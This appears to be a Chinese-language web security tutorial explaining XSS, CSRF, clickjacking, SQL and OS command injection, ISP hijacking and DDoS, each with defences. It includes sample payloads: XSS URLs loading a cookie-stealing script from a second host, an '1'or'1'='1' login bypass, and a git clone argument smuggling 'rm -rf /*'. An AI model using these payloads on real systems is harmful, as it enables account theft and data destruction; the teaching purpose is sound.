# 1、常见web攻击

## 目标目录

- 掌握XSS (实施 + 防御)
- 掌握CSRF (实施 + 防御)
- 掌握点击劫持 (实施 + 防御)
- 掌握SQL注入 (实施 + 防御)
- 掌握OS注入 (实施 + 防御)
- 了解请求劫持
- 了解DDOS


## XSS

- XSS (Cross-Site Scripting)，跨站脚本攻击，因为缩写和CSS重叠，所以只能叫 XSS。
- 跨站脚本攻击，是指通过存在安全漏洞的Web网站，注册用户的浏览器内运行非法的非本站点JavaScript脚本进行的一种攻击。
- 跨站脚本攻击有可能造成以下影响：
- 利用虚假输入表单骗取用户个人信息。
- 利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。
- 显示伪造的文章或图片。

### XSS分类

- 反射型：url参数直接注入
    - 所谓反射型，就是攻击脚本必须放在另外的地方，才能完成攻击：`from=<script src="http://localhost:4000/hack.js"`
        ```js
        // 普通
        http://localhost:3000/?from=china
        // alert尝试
        http://localhost:3000/?from=<script>alert(3)</script>
        // 获取Cookie
        http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"> </script>
        ```
    - 为了在url不被一眼看出来攻击脚本，可以使用短域名伪造
        - 短域名伪造（https://dwz.cn/）之后，得到的url和原本的攻击url是同等效力的。
- 存储型：存储到DB后读取时注入
    - 在页面上通过表单输入的攻击脚本，存储注入在数据库中，等到页面刷新获取到该数据时，攻击脚本就被执行

### XSS攻击的危害

执行脚本Scripting能干啥，XSS攻击就能干啥：
- 获取页面数据
- 获取Cookies
- 劫持前端逻辑
- 发送请求
- 偷取网站的任意数据
- 偷取用户的资料
- 偷取用户的秘密和登录态
- 欺骗用户

### 防御手段（4种）

- head设置**X-XSS-Protection**（这是一种过时的方法，chrome已经将该功能去掉了）
    - 'X-XSS-Protection'设置为0，可以把浏览器默认的XSS过滤禁止掉
    ```js
    ctx.set('X-XSS-Protection', 0) // 禁止XSS过滤
    // 0 禁止XSS过滤。
    // 1 启用XSS过滤(通常浏览器是默认的)。 如果检测到跨站脚本攻击，浏览器将清除页面(删除不安全的部分)
    ```
- CSP内容安全策略 (CSP, Content Security Policy)
    - CSP是一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括跨站脚本 (XSS) 和数据注入等攻击。
    - CSP本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。
    - 服务端配置：
        ```bash
        # 只允许加载本站资源
        Content-Security-Policy: default-src 'self'
        # 只允许加载 HTTPS 协议图片
        Content-Security-Policy: img-src https://*
        # 不允许加载任何来源框架
        Content-Security-Policy: child-src 'none'
        ```
        xss防御可以使用，如下所示，script标签中加载外部网站攻击脚本hack.js的调用被拦截：
        ```js
        ctx.set('Content-Security-Policy', "default-src 'self'")
        // 尝试一下外部资源不能加载
        http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"> </script>
        ```
- 转义字符
    - 黑名单转义（定义哪些符号不行）
        - 用户的输入永远不可信任的，最普遍的做法就是转义输入输出的内容，对于引号、尖括号、斜杠等，进行转义
        ```js
        function escape(str) {
            str = str.replace(/&/g, '&amp;')
            str = str.replace(/</g, '&lt;')
            str = str.replace(/>/g, '&gt;')
            str = str.replace(/"/g, '&quto;')
            str = str.replace(/'/g, '&#39;')
            str = str.replace(/`/g, '&#96;')
            str = str.replace(/\//g, '&#x2F;')

            return str
        }

        escape(ctx.query.from)
        ```
        - 但对于**富文本**来说，显然不能通过上面黑名单的办法来转义所有字符，因为这样会把需要的格式也过滤掉。当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，因此对于富文本，通常采用白名单转义过滤的办法。
    - 白名单转义（定义哪些符号可以）
        - 白名单内的不会被过滤掉，只有白名单之外的会被过滤掉
        - 白名单过滤的实现是比较复杂的，所以通常使用第三方库xss来做：
        ```js
        const xss = require('xss')
        let html = xss('<h1 id="title">XSS Demo</h1><script>alert("xss");</script>')
        // 转义为 => <h1>XSS Demo</h1>&lt;script&gt;alert("xss");&lt;/script&gt;
        console.log(html)
        ```
- Cookie设置httpOnly
    - 这是预防XSS攻击窃取用户cookie，最有效的防御手段。
    - Web应用程序在设置cookie时，将其属性设为HttpOnly，就可以避免该网页的cookie被客户端恶意JavaScript窃取，保护用户cookie信息。
    - （使用cookie登录鉴权过程中，实际根本不需要客户端js参与，因此后端添加httpOnly只在网络传输中使用，是完全合理的）
    ```js
    response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly")
    ```

## CSRF

CSRF(Cross Site Request Forgery)，即跨站请求伪造，是一种常见的Web攻击，它利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。流程如下：
- 受害者登录a.com，并保留了登录凭证（Cookie）。
- 攻击者引诱受害者访问了b.com。
- b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带a.com的Cookie。
- a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。
- a.com以受害者的名义执行了act=xx。
- 攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让a.com执行了自己定义的操作。


### CSRF防御

CSRF其实防范起来并不容易，没有一种绝对的防范机制。

- 1、`Referer Check`：（理论上是可以防御的，但实际上并不那么有效）
    - 理论上服务端可以从请求头中拿到referer字段，如果判断不同源则直接拒绝掉
    ```js
    app.use(async (ctx, next) => {
        await next()
        const referer = ctx.request.header.referer
        console.log('Referer:', referer)
    })
    ```
    - 但实际上，这并不是很有效的防御手段，因为referer也是可以伪造的。
    - 另外，从https的页面请求到http的页面，referer头会被丢弃。
::: tip Referer字段
[阮一峰：HTTP Referer 教程](http://www.ruanyifeng.com/blog/2019/06/http-referer.html)

HTTP 协议在请求（request）的头信息里面，设计了一个Referer字段，给出 "引荐网页"的 URL。

Referer 请求头可能暴露用户的浏览历史，涉及到用户的隐私问题，因此，HTTP请求不一定会包含Referer字段：
- 不发送：
    - 用户在地址栏输入网址，或者选中浏览器书签，就不发送Referer字段。
    - 来源页面采用的协议为表示本地文件的 "file" 或者 "data" URI；
    - 当前请求页面采用的是非安全协议，而来源页面采用的是安全协议（HTTPS）。即**从https的页面请求到http的页面，referer头会被丢弃。**
- 会发送：
    - 1、用户点击网页上的链接。
    - 2、用户发送表单。
    - 3、网页加载静态资源，比如加载图片、脚本、样式。
:::
- 2、`人机识别（使用验证码）`
    - csrf攻击需要程序来执行，并不能做到完全自动，所以如果增加验证码或者其他人机识别验证的步骤，就能有效屏蔽
    - 不过也不是绝对的，比如抢火车票，通过图像识别也是可以破解的
- 3、`使用token验证`来替代cookie鉴权，这是目前相对来说，公认最合适的方案。


## 点击劫持 - clickjacking

点击劫持是一种`视觉欺骗`的攻击手段。攻击者将需要攻击的网站通过 iframe 嵌套的方式嵌入自己的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击。

如图，将需要攻击的网站通过iframe嵌套到自己充满诱惑性的网页中，将iframe设为透明且z-index的层级设为最高，并很心机的将「诱导按钮」与要攻击的网站的「点赞」按钮相重合，这时用户因为喜欢小姐姐，点击诱导按钮，但实际点击的是点赞按钮，这样就在要攻击的网站中完成了点赞操作。

<img src="./images/clickjacking.png" height="240">



### 点击劫持防御

本质上，防御点击劫持，就是不让我们自己的网站被别人用iframe嵌套引用。

- 方法1：`X-FRAME-OPTIONS`，是一个 HTTP 响应头，在现代浏览器有一个很好的支持。这个 HTTP 响应头就是为了防御用 iframe 嵌套的点击劫持攻击。
    该响应头有三个值可选，分别是：
    - DENY：表示页面不允许通过 iframe 的方式展示
    - SAMEORIGIN：表示页面可以在相同域名下通过 iframe 的方式展示
    - ALLOW-FROM：表示页面可以在指定来源的 iframe 中展示
    ```js
    ctx.set('X-FRAME-OPTIONS', 'DENY')
    ```

- 方法2：除了设置`X-FRAME-OPTIONS`响应头，对于一些低级别浏览器，还可以使用js来实现：
    ```html
    <!-- 代码的作用就是当通过 iframe 的方式加载页面时，攻击者的网页直接不显示所有内容了。 -->
    <head>
        <style id="click-jack">
            /* 默认设置为 不显示样式 */
            html {
                display: none !important;
            }
        </style>
    </head>
    <body>
        <script>
            // self是对当前窗口自身的引用，window属性是等价的
            // top返回顶层窗口，即浏览器窗口
            if (self == top) {
                // 二者相同，说明不是一个被iframe展示的页面，就去掉默认设置的”不显示样式“
                var style = document.getElementById('click-jack')
                document.body.removeChild(style)
            } else {
                // 二者不同，则将恶意网站的访问地址top.location，和iframe的访问地址（也就是我们自己的网站地址）拉到一起
                // 这时，恶意网站就会直接跳转到我们的网站，从而避免了被点击劫持攻击
                top.location = self.location
            }
        </script>
    </body>
    ```

## SQL注入

```js
// 填入特殊密码
1'or'1'='1

// 拼接后的SQL
`
SELECT *
FROM test.user
WHERE username = 'laowang'
AND password = '1'or'1'='1'
`
```
此时，or将SQL语句分成了前后两部分，且只要有一个成立就肯定成立。'1'='1'为后半部分，前半部分不管成立与否，后半部分都是”真“，则此sql查询用户信息肯定会通过，则登录成功。


### SQL注入防御

`参数化查询接口`：所有的查询语句建议使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中，**即不要直接拼接 SQL 语句**。例如 Node.js 中的 mysqljs 库的 query 方法中的 `? 占位参数`。
```js
const { username, password } = ctx.request.body

let sql = `
SELECT *
FROM test.user
WHERE username = ?
AND password = ?
`

res = await query(sql, [username, password])
```


除此之外，还应该：
- **严格限制Web应用的数据库的操作权限**，给此用户提供仅仅能够满足其工作的最低权限，从而 最大限度的减少注入攻击对数据库的危害。
- **后端代码检查输入的数据是否符合预期**，严格限制变量的类型，例如使用正则表达式进行一些 匹配处理。
- **对进入数据库的特殊字符('，"，\，<，>，&，*，; 等)进行转义处理，或编码转换**。基本上 所有的后端语言都有对字符串进行转义处理的方法，比如 lodash 的 lodash._escapehtmlchar 库。


## OS命令注入

OS命令注入和SQL注入差不多，只不过SQL注入是针对数据库的，而OS命令注入是针对操作系统的。

OS命令注入攻击指通过Web应用，执行非法的操作系统命令达到攻击的目的。只要在能调用Shell函数的地方就有存在 被攻击的风险。倘若调用Shell时存在疏漏，就可以执行插入的非法命令。

```js
// 以 Node.js 为例，假如在接口中需要从 github 下载用户指定的 repo
const exec = require('mz/child_process').exec;

let params = {/* 用户输入的参数 */};

exec(`git clone ${params.repo} /some/path`);
```
如果用户输入的参数是：
```bash
https://github.com/xx/xx.git && rm -rf /* &&
```
clone repo后，会直接`rm -rf /*`，删除全盘。。。。


## 请求劫持（运营商劫持）

`运营商劫持`：运营商通过某些方式篡改了用户正常访问的网页，插入广告或者其他一些杂七杂八的东西。

在具体的做法上，一般分为`DNS劫持`和`HTTP劫持`：

- `DNS劫持`：一般而言，用户上网的DNS服务器都是运营商分配的，所以，在这个节点上，运营商可以为所欲为。
    - 例如，访问http://qq.com/index.html，正常DNS应该返回腾讯的ip，而DNS劫持后，会返回一个运营商的**中间服务器ip**。访问该服务器会一致性的**返回302**，让用户浏览器**跳转到预处理好的带广告的网页**，在**该网页中再通过iframe打开用户原来访问的地址**。
- `HTTP劫持`：**在运营商的路由器节点上，设置协议检测**，一旦发现是**HTTP请求，而且是html类型请求，则拦截处理**。后续做法往往分为2种：
    - 1种是类似DNS劫持，返回302让用户浏览器跳转到另外的地址
    - 还有1种是在服务器返回的HTML数据中插入js或dom节点（广告）。

防御的话，大概只能升级HTTPS了。

## DDOS

[DDOS 攻击的防范教程](http://www.ruanyifeng.com/blog/2018/06/ddos.html)

DDOS（distributed denial of service，`分布式停止服务`攻击）。DDOS 不是一种攻击，而是一大类攻击的总称。它有几十种类型，新的攻击方法还在不断发明出来。网站运行的各个环节，都可以是攻击目标。只要把一个环节攻破，使得整个流程跑不起来，就达到了瘫痪服务的目的。

其中，比较常见的一种攻击是 cc 攻击。它就是简单粗暴地送来大量正常的请求，超出服务器的最大承受量，导致宕机。我遭遇的就是 cc 攻击，最多的时候全世界大概20多个 IP 地址轮流发出请求，每个地 址的请求量在每秒200次~300次。我看访问日志的时候，就觉得那些请求像洪水一样涌来，一眨眼就是一大堆，几分钟的时间，日志文件的体积就大了100MB。说实话，这只能算小攻击，但是我的个人网站没有任何防护，服务器还是跟其他人共享的，这种流量一来立刻就下线了。


常见攻击方式：
- SYN Flood：
    - 此攻击通过向目标发送具有欺骗性源IP地址的大量TCP“初始连接请求”SYN数据包来利用TCP握手。
    - 目标机器响应每个连接请求，然后等待握手中的最后一步，这一步永远不会发生，耗尽了进程中的目标资源。
    - 类似于”等待第二只靴子落地“那个故事。
- HTTP Flood：
    - 此攻击类似于同时在多个不同计算机上反复按Web浏览器中的刷新，大量HTTP请求泛滥服务器，导致拒绝服务。


防御手段：
- 备份网站
    - 备份网站不一定是全功能的，如果能做到全静态浏览，就能满足需求。最低限度应该可以显示公告，告诉用户，网站出了问题，正在全力抢修。
- HTTP请求的拦截，高防IP
- 靠谱的运营商 多个 Docker 硬件 服务器 防火墙
- 带宽扩容 + CDN，提高犯罪成本






